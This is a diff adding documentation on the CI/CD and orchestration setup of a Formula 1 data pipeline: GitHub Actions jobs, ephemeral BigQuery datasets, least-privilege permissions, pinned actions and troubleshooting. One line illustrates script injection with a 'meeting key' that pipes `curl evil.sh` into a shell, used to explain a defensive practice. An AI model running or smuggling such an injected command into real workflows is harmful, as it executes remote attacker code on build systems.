@@ -719,6 +719,110 @@ Checks run at five levels; each catches what the others can't:
 
 > **In short.** The marts are the finished tables: one per question, each saying exactly what one row is. Tyre wear is the slope of a straight line through each stint's clean laps, calculated with two SQL functions; it understates wear because cars get lighter as fuel burns, so the website adds a labelled correction. An undercut is a car pitting just behind a rival who then stops within three laps, and it "works" if the car comes out ahead. Quality checks sit at every layer: impossible data stops the build so the public dashboard keeps its last good version, odd-but-real data only raises a warning, and every failing row is saved in an `audit` dataset to look at later.
 
+### CI/CD and orchestration (`.github/workflows/pitwall-*.yml`)
+
+Two GitHub Actions workflows run everything automatically: **`pitwall-ci`** checks every pull request, and **`pitwall-pipeline`** runs the real pipeline every Monday in prod, on demand, and on every release. Nothing runs on a laptop in production.
+
+#### 1. From zero: CI, CD and GitHub Actions
+
+- **CI (continuous integration):** every proposed change is checked automatically — lint, tests, builds — *before* it is merged. The tests from the previous section run here on every pull request.
+- **CD (continuous delivery/deployment):** once a change is accepted, the path to production is automatic too: here, a release to `main` republishes the site, and the Monday run feeds prod.
+- **GitHub Actions vocabulary:**
+
+| Term | Meaning | In pitwall |
+|---|---|---|
+| **workflow** | a YAML file in `.github/workflows/` describing automation | `pitwall-ci.yml`, `pitwall-pipeline.yml` |
+| **trigger** (`on:`) | what starts it | a pull request, a cron schedule, a push to `main`, a manual button |
+| **job** | a group of steps on one fresh virtual machine (**runner**); jobs run in parallel unless one `needs` another | `python`, `terraform`, `dbt`, `site-data`, `site-build`, `deploy` |
+| **step** | one command (`run:`) or a reusable action (`uses:`) | `make test`, `google-github-actions/auth` |
+| **environment** | a named target with its own variables and protection rules | `dev`, `prod`, `github-pages` |
+| **artifact** | a file a job uploads so a later job can download it | the site's Parquet files, the built site |
+
+Every job starts on a **clean machine** that is thrown away afterwards: nothing survives between jobs except artifacts, which is why the site data is uploaded by one job and downloaded by the next.
+
+#### 2. `pitwall-ci`: what checks a pull request
+
+Triggered by any PR that touches `projects/pitwall/**`, `site/**` or these workflows (a **path filter**: a docs-only PR elsewhere doesn't spend CI minutes on pitwall). Five jobs, about 2–3 minutes in total (last run: dbt 2 min 14 s, everything else under 30 s):
+
+```
+python      uv sync --locked → make lint (ruff) → make test (pytest, 90+ tests, no cloud)
+terraform   fmt -check → init -backend=false → validate        (syntax and types, no GCP)
+dbt         WIF login (dev) → create ci_pr_<n>_<run>_{staging,intermediate,marts,audit}
+            → dbt build --target ci (reads dev's raw tables) → drop the datasets (always)
+site-data   WIF login (dev) → site-export from dev marts → upload artifact
+site-build  download artifact → npm ci --ignore-scripts → npm run build   (no GCP access)
+```
+
+- **Ephemeral datasets per run.** dbt can't be tested without BigQuery, so each CI run builds every model and test into its **own throwaway datasets**, reading dev's `raw` tables (which is why dev must always hold ingested data). `generate_schema_name` (block 4) adds the prefix; the last step drops them with `if: always()`, which runs even when the build failed. Belt and braces: the datasets are created with a 1-day default table expiration, so if the drop step never runs (a cancelled job), the tables delete themselves.
+- **The run ID is in the name** (`ci_pr_12_<run_id>`). With `concurrency: cancel-in-progress`, pushing a new commit cancels the PR's previous run; if both shared one dataset name, the old run's cleanup could drop the new run's tables mid-build.
+- **`terraform validate` without a backend** (`-backend=false`) checks the code without state or credentials: CI never applies infrastructure (block 3).
+- **Forks and Dependabot are skipped, not failed.** They can't mint the OIDC token WIF needs, so the cloud jobs have an `if:` that skips them for PRs from outside the repo.
+- **Known shortcut:** CI's `site-data` exports from dev's *marts*, not from the PR's freshly built `ci_pr_*` marts, so a PR changing a mart and the site at once is only fully checked after merge (recorded as a deferred minor).
+
+**Is green CI enforced?** Partly. The repository rules on `dev` and `main` require a pull request and forbid force-pushes and deletion, but they have **no required status checks**: GitHub itself would allow merging a red PR. The `ship` procedure refuses to merge until CI is green, which makes it process, not enforcement. Making it a hard rule has a catch: a *required* check from a *path-filtered* workflow never reports on PRs that don't touch those paths, so it stays "pending" forever and blocks unrelated PRs. Tracked in #53 (the usual fix: one always-running gate job that is the only required check).
+
+#### 3. `pitwall-pipeline`: the production run
+
+Three triggers, one workflow:
+
+| Trigger | Environment | What runs | Mode |
+|---|---|---|---|
+| **cron `0 6 * * 1`** (Monday 06:00 UTC, the morning after a race weekend) | prod | ingest → load → transform → site → deploy | `--latest` |
+| **manual** (Actions → Run workflow, or `gh workflow run pitwall-pipeline.yml -f env=… -f mode=… -f value=…`) | dev or prod | same; site only for prod | `latest`, `meeting`, `season` or `none` |
+| **push to `main`** touching pitwall or the site (a release) | prod | load → transform → site → deploy, **no API call** | `none` |
+
+```
+run (environment: prod)                    ← pipeline service account
+  validate inputs → checkout main → WIF login → uv sync
+  → make ingest (unless mode=none) → make load → make transform (dbt build + all tests)
+site-data (environment: prod)              ← only if `run` succeeded; dashboard (read-only) account
+  checkout main → WIF login → site-export from prod marts → upload artifact
+site-build                                  ← no cloud credentials at all
+  npm ci --ignore-scripts → npm run build → upload Pages artifact
+deploy (environment: github-pages)
+  publish to https://tomasripsky.github.io/data-engineering-lab/
+```
+
+A release run took about 5 minutes end to end (run 3.5 min, site 1 min, deploy 15 s). A Monday run with a new Grand Prix adds ~1 minute of API calls per race weekend.
+
+**Design choices, one by one:**
+- **Prod only runs released code.** Every prod job checks out `main`, whatever triggered it. `dev` is where work lands; `main` changes only through a release Tomas approves. The WIF condition (block 3) enforces the same thing on the GCP side.
+- **But the *workflow file* for the cron comes from `dev`.** GitHub runs scheduled workflows from the latest commit on the **default branch** (`dev` here). So a change to `pitwall-pipeline.yml` merged into `dev` affects the very next Monday prod run, before any release — even though the *code* it runs comes from `main`. Workflow changes deserve the same care as prod changes.
+- **The site only follows a fully green run.** `site-data` has `needs: run` and `if: needs.run.result == 'success'`: if ingestion, load or any `error` dbt test fails, nothing is exported and the public site keeps its last good version (block 5). `site-export` adds its own guard: it refuses to publish empty tables.
+- **Least privilege per job.** `run` uses the pipeline account (writes the lake and datasets); `site-data` uses the **read-only dashboard account** (reads marts only); `site-build`, which runs third-party npm code, gets **no** `id-token` permission at all; only `deploy` can write to Pages.
+- **No overlapping runs.** `concurrency: pitwall-pipeline-<env>` with `cancel-in-progress: false`: a second run *waits* instead of interrupting the first halfway through a load (block 2: twelve load jobs are not atomic together).
+- **Inputs are validated before touching GCP**, and they reach shell commands through environment variables (`$MODE`, `$VALUE`), never pasted into the script with `${{ … }}`. Pasting untrusted text into a script is **script injection**: a "meeting key" like `1; curl evil.sh | sh` would be executed. GitHub's own security guidance is exactly this pattern.
+- **The schedule has an off switch.** The cron job only runs when the repository variable `PITWALL_SCHEDULE` is `on` (set once prod existed), so the workflow could exist before prod did.
+- **Every third-party action is pinned to a commit SHA** (`actions/checkout@3d3c42e…  # v7.0.1`), not a tag. A tag like `v7` can be moved by whoever controls the action's repository — in March 2025 the popular `tj-actions/changed-files` was compromised exactly that way, and every workflow using its tags ran the attacker's code. A commit SHA can't be moved. The comment keeps it readable; Dependabot updates both.
+- **Lock files everywhere:** `uv sync --locked` fails if `uv.lock` is out of date instead of silently resolving new versions; `npm ci` installs exactly `package-lock.json`, with `--ignore-scripts` so packages can't run install-time code.
+
+#### 4. Why GitHub Actions is the orchestrator ([ADR 0006](decisions/0006-github-actions-as-orchestrator.md))
+
+An orchestrator decides *when* each step runs, in which order, and what happens when one fails. pitwall's pipeline is one straight line of three steps, once a week:
+
+| Option | Cost | Why not (here) | When it would win |
+|---|---|---|---|
+| **GitHub Actions** (chosen) | free on a public repo | — | linear pipelines, small teams, runs that should be publicly visible |
+| Airflow / Dagster self-hosted | a server + a database, always on | overkill for one linear DAG | many interdependent pipelines, backfills by date, sensors, lineage UI |
+| Cloud Composer (managed Airflow) | ~US$300+/month minimum | cost | an organisation already on GCP with dozens of DAGs |
+| Cloud Run Jobs + Cloud Scheduler | nearly free | more Terraform, invisible to portfolio readers | GCP-native batch jobs that must not depend on GitHub |
+
+What we give up, honestly: GitHub's cron is **best-effort** (runs can start late at busy times), there are no per-step retries or data-aware scheduling, and **GitHub disables scheduled workflows after 60 days without repository activity** — possible in the December–February off-season; re-enable from the Actions tab. When a project has several pipelines depending on each other, a real orchestrator becomes the right call.
+
+#### 5. Local vs CI vs prod
+
+| | Laptop | CI (`pitwall-ci`) | Prod (`pitwall-pipeline`) |
+|---|---|---|---|
+| Identity | your `gcloud` user | dev pipeline account via WIF | prod pipeline account + read-only dashboard account via WIF |
+| Code | your working tree | the PR's branch | `main` only |
+| BigQuery datasets | dev's `staging`/`intermediate`/`marts` | `ci_pr_<n>_<run>_*`, dropped after the run | prod's `staging`/`intermediate`/`marts` |
+| Raw data | dev lake | dev's `raw` (read only) | prod lake and `raw` |
+| Commands | `make test`, `make transform`… | the same `make` targets | the same `make` targets |
+
+The Makefile is the shared contract: CI and prod call the same `make` targets you run by hand, so "works on my machine" and "works in CI" run the same commands.
+
+> **In short.** Every pull request is checked by robots in about two minutes: code style, the Python tests, the Terraform files, and the whole dbt project built into temporary BigQuery datasets that are deleted right after. Every Monday morning a second robot runs the real pipeline in production — download the new race, load it, rebuild and test the models — and only if every step passes does it rebuild and publish the website; otherwise the old site stays up. Production only ever runs the code from `main`, each step only gets the permissions it needs, and nothing has a password: all logins go through the keyless system from block 3.
+
 ## Local vs production
 
 | | Laptop | Cloud (dev / prod) |
@@ -753,3 +857,7 @@ Checks run at five levels; each catches what the others can't:
 | Degradation looks negative or zero on hard tyres | Fuel burn makes cars ~0.03–0.06 s/lap faster, hiding wear (and drying tracks on intermediates) | Expected: read the fuel-corrected curve on the site; the raw slope is documented as biased |
 | Sprint `grid_position` is null for a new season | OpenF1 renamed the sprint qualifying session again (it was "Sprint Shootout" in 2023) | Add the new name to the `case` in `fct_session_results` and to its unit test |
 | Tests green but the pipeline warns "dropping columns not in the contract" or "contract fields absent from every record" | OpenF1 added or renamed a field; the recordings are older than the change | Follow "When OpenF1 changes" in the tests section: re-record, read the diff, decide per field |
+| The Monday run didn't happen | Scheduled workflows are disabled after 60 days without repo activity, `PITWALL_SCHEDULE` isn't `on`, or GitHub delayed the cron | Actions tab → re-enable; check the variable; run it by hand (`mode=latest`, `env=prod`) |
+| Prod's Monday run broke right after a merge into `dev`, with no release | The cron uses the workflow file from the default branch (`dev`), even though it checks out `main`'s code | Fix the workflow on `dev`; treat workflow changes as prod changes |
+| CI's dbt job fails with "Not found: Dataset … raw" or zero rows everywhere | Dev's `raw` is empty (fresh environment, or after `make destroy`) | Ingest at least one season into dev, then `make load ENV=dev` |
+| A PR's CI never starts | The PR doesn't touch the workflow's paths, or it comes from a fork/Dependabot (cloud jobs skipped) | Expected; for forks, a maintainer re-runs from a branch in the repo |
